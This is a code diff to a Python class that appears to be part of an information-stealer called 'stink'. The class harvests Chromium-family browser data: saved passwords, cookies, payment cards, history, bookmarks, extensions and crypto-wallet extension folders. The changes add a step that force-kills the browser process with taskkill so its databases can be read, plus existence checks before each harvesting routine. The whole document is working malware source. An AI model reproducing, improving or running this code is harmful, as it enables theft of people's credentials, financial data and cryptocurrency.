@@ -1,14 +1,14 @@
 from re import compile
-from os import path, listdir
 from base64 import b64decode
 from json import load, loads
 from typing import Tuple, List
+from os import path, listdir, system
 from datetime import datetime, timedelta
 from sqlite3 import connect, Connection, Cursor
 from ctypes import windll, byref, cdll, c_buffer
 
 from stink.enums.features import Features
-from stink.helpers.config import ChromiumConfig
+from stink.helpers.config import ChromiumConfig, Browsers
 from stink.helpers import AESModeOfOperationGCM, DataBlob, MemoryStorage
 
 
@@ -16,17 +16,21 @@ class Chromium:
     """
     Collects data from the browser.
     """
-    def __init__(self, browser_name: str, state_path: str, browser_path: str, statuses: List):
+    def __init__(self, browser_name: str, state_path: str, browser_path: str, process_name: str, statuses: List):
 
         self.__browser_name = browser_name
         self.__state_path = state_path
         self.__browser_path = browser_path
+        self.__process_name = process_name
         self.__statuses = statuses
         self.__profiles = None
 
         self.__storage = MemoryStorage()
         self.__config = ChromiumConfig()
         self.__path = path.join("Browsers", self.__browser_name)
+
+    def _kill_process(self):
+        system(f"taskkill /f /im {self.__process_name}")
 
     def _get_profiles(self) -> List:
         """
@@ -38,12 +42,11 @@ class Chromium:
         Returns:
         - list: List of all browser profiles.
         """
-        if self.__browser_path[-9:] in ["User Data"]:
+        if self.__browser_name == Browsers.OPERA_GX.value:
+            return [self.__browser_path]
 
-            pattern = compile(r"Default|Profile \d+")
-            return [path.join(self.__browser_path, profile) for profile in sum([pattern.findall(dir_path) for dir_path in listdir(self.__browser_path)], [])]
-
-        return [self.__browser_path]
+        pattern = compile(r"Default|Profile \d+")
+        return [path.join(self.__browser_path, profile) for profile in sum([pattern.findall(dir_path) for dir_path in listdir(self.__browser_path)], [])]
 
     def _check_paths(self) -> None:
         """
@@ -179,6 +182,10 @@ class Chromium:
         Returns:
         - None.
         """
+        if not path.exists(file_path):
+            print(f"[{self.__browser_name}]: No passwords found")
+            return
+
         cursor, connection = self._get_db_connection(file_path)
         passwords_list = cursor.execute(self.__config.PasswordsSQL).fetchall()
 
@@ -211,6 +218,10 @@ class Chromium:
         Returns:
         - None.
         """
+        if not path.exists(file_path):
+            print(f"[{self.__browser_name}]: No cookies found")
+            return
+
         cursor, connection = self._get_db_connection(file_path)
         cookies_list = cursor.execute(self.__config.CookiesSQL).fetchall()
 
@@ -245,6 +256,10 @@ class Chromium:
         Returns:
         - None.
         """
+        if not path.exists(file_path):
+            print(f"[{self.__browser_name}]: No cards found")
+            return
+
         cursor, connection = self._get_db_connection(file_path)
         cards_list = cursor.execute(self.__config.CardsSQL).fetchall()
 
@@ -277,6 +292,10 @@ class Chromium:
         Returns:
         - None.
         """
+        if not path.exists(file_path):
+            print(f"[{self.__browser_name}]: No history found")
+            return
+
         cursor, connection = self._get_db_connection(file_path)
         results = cursor.execute(self.__config.HistorySQL).fetchall()
         history_list = [cursor.execute(self.__config.HistoryLinksSQL % int(item[0])).fetchone() for item in results]
@@ -310,6 +329,10 @@ class Chromium:
         Returns:
         - None.
         """
+        if not path.exists(file_path):
+            print(f"[{self.__browser_name}]: No bookmarks found")
+            return
+
         file = self._get_file(file_path)
         bookmarks_list = sum([self.__config.BookmarksRegex.findall(item) for item in file.split("{")], [])
 
@@ -338,6 +361,10 @@ class Chromium:
         Returns:
         - None.
         """
+        if not path.exists(extensions_path):
+            print(f"[{self.__browser_name}]: No extensions found")
+            return
+
         extensions_list = []
         extensions_dirs = listdir(extensions_path)
 
@@ -379,6 +406,10 @@ class Chromium:
         Returns:
         - None.
         """
+        if not path.exists(wallets):
+            print(f"[{self.__browser_name}]: No wallets found")
+            return
+
         for wallet in self.__config.WalletLogs:
             for extension in wallet["folders"]:
 
@@ -489,6 +520,7 @@ class Chromium:
         """
         try:
 
+            self._kill_process()
             self._check_paths()
             self._check_profiles()
 
